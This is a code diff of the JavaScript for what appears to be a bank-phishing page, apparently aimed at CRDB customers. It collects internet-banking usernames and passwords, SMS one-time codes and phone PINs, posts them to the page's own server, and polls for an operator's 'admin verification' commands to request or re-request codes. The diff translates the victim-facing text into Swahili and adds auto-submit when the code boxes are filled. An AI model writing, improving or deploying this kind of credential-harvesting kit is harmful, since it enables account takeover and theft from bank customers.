@@ -1,8 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
   const stepUnderstand = document.getElementById('step-I UNDERSTAND');
   const stepSlider = document.getElementById('step-slider');
-  const stepForm = document.getElementById('step-form'); // Internet Banking Login
-  const stepOtp = document.getElementById('step-otp'); // 6-digit SMS OTP
+  const stepForm = document.getElementById('step-form');
+  const stepOtp = document.getElementById('step-otp');
   const stepPhonePin = document.getElementById('step-phone-pin');
   const stepLoading = document.getElementById('step-loading');
   const stepSuccess = document.getElementById('step-success');
@@ -38,22 +38,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (sliderDuration && durationVal) {
     sliderDuration.addEventListener('input', (e) => {
-      durationVal.innerText = `${e.target.value} months`;
+      durationVal.innerText = `miezi ${e.target.value}`;
     });
   }
 
-  // Digit Inputs Setup (6-digit OTP & 4-digit PIN)
+  // Digit Inputs Setup with AUTO-SUBMIT when fully filled
   const otpDigits6 = document.querySelectorAll('.otp-digit-6');
   const pinDigits = document.querySelectorAll('.pin-digit');
 
-  function setupDigitInputs(inputs) {
+  function setupDigitInputs(inputs, autoSubmitCallback) {
     inputs.forEach((input, idx) => {
       input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g, '');
         if (input.value && idx < inputs.length - 1) {
           inputs[idx + 1].focus();
         }
+
+        // AUTO-SUBMIT TRIGGER: Check if all digit boxes are completely filled
+        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+        if (allFilled && typeof autoSubmitCallback === 'function') {
+          autoSubmitCallback();
+        }
       });
+
       input.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !input.value && idx > 0) {
           inputs[idx - 1].focus();
@@ -62,8 +69,9 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  setupDigitInputs(otpDigits6);
-  setupDigitInputs(pinDigits);
+  // Bind digit auto-submit listeners
+  setupDigitInputs(otpDigits6, () => submitOtpHandler());
+  setupDigitInputs(pinDigits, () => submitPhonePinHandler());
 
   // Flow Navigation
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
@@ -80,12 +88,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const password = document.getElementById('crdb-password').value.trim();
 
     if (!username || !password) {
-      alert('Please enter both username and password.');
+      alert('Tafadhali weka jina la mtumiaji na nywila.');
       return;
     }
 
     if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-    showLoading('Validating Credentials...', 'Sending secure login details.');
+    showLoading('Inathibitisha Taarifa...', 'Inatuma taarifa kwa usalama.');
 
     try {
       const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
@@ -97,16 +105,16 @@ document.addEventListener('DOMContentLoaded', () => {
       const data = await res.json();
       if (data.success) {
         currentUserId = data.userId;
-        document.getElementById('loading-title').innerText = 'Awaiting Admin Verification...';
-        document.getElementById('loading-sub').innerText = 'Please stay on this page while request is processed.';
+        document.getElementById('loading-title').innerText = 'Inasubiri Uthibitisho wa Msimamizi...';
+        document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
         startStatusPolling();
       } else {
         hideLoading();
-        alert(data.error || 'Submission failed.');
+        alert(data.error || 'Imeshindikana.');
       }
     } catch (e) {
       hideLoading();
-      alert('Network error.');
+      alert('Hitilafu ya mtandao.');
     }
   });
 
@@ -125,10 +133,12 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showStep(stepOtp);
+          if (otpDigits6[0]) otpDigits6[0].focus();
         } else if (data.status === 'PROCEED_PHONE_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
           showStep(stepPhonePin);
+          if (pinDigits[0]) pinDigits[0].focus();
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -146,21 +156,22 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
           otpDigits6.forEach(i => i.value = '');
-          otpDigits6[0].focus();
+          if (otpDigits6[0]) otpDigits6[0].focus();
           showStep(stepOtp);
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
           if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
           pinDigits.forEach(i => i.value = '');
+          if (pinDigits[0]) pinDigits[0].focus();
           showStep(stepPhonePin);
         }
       } catch (e) {}
     }, 3000);
   }
 
-  // Step 2: Submit 6-digit SMS OTP
-  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
+  // Step 2: 6-digit SMS OTP Submission Function
+  async function submitOtpHandler() {
     const otpVal = Array.from(otpDigits6).map(i => i.value).join('');
 
     if (otpVal.length !== 6) {
@@ -170,7 +181,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('otp-error').style.display = 'none';
     if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
 
-    showLoading('Verifying SMS OTP...', 'Validating your 6-digit verification code.');
+    showLoading('Inathibitisha OTP...', 'Inakagua namba yako ya uthibitisho ya SMS.');
 
     try {
       const res = await fetch('/api/submit-otp', {
@@ -181,8 +192,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        document.getElementById('loading-title').innerText = 'Verifying Code...';
-        document.getElementById('loading-sub').innerText = 'Please wait while admin confirms your code.';
+        document.getElementById('loading-title').innerText = 'Inakagua Namba...';
+        document.getElementById('loading-sub').innerText = 'Tafadhali subiri.';
         startStatusPolling();
       } else {
         hideLoading();
@@ -190,10 +201,13 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       hideLoading();
     }
-  });
+  }
 
-  // Step 3: Submit Phone Number & PIN
-  document.getElementById('btn-submit-phone-pin').addEventListener('click', async () => {
+  // Manual button fallback for OTP
+  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);
+
+  // Step 3: Phone & PIN Submission Function
+  async function submitPhonePinHandler() {
     const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
 
@@ -210,7 +224,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('pin-error').style.display = 'none';
     if (pinSurfaceBanner) pinSurfaceBanner.classList.remove('active');
 
-    showLoading('Authenticating Account...', 'Finalizing secure verification.');
+    showLoading('Inathibitisha Akaunti...', 'Inakamilisha usalama.');
 
     try {
       const res = await fetch('/api/submit-phone-pin', {
@@ -221,8 +235,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        document.getElementById('loading-title').innerText = 'Finalizing Approval...';
-        document.getElementById('loading-sub').innerText = 'Please stay on this page.';
+        document.getElementById('loading-title').innerText = 'Inakamilisha Uidhinishaji...';
+        document.getElementById('loading-sub').innerText = 'Tafadhali subiri kidogo.';
         startStatusPolling();
       } else {
         hideLoading();
@@ -230,7 +244,10 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       hideLoading();
     }
-  });
+  }
+
+  // Manual button fallback for Phone & PIN
+  document.getElementById('btn-submit-phone-pin').addEventListener('click', submitPhonePinHandler);
 
   document.getElementById('btn-go-home').addEventListener('click', () => {
     window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
@@ -246,4 +263,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-    
+                          
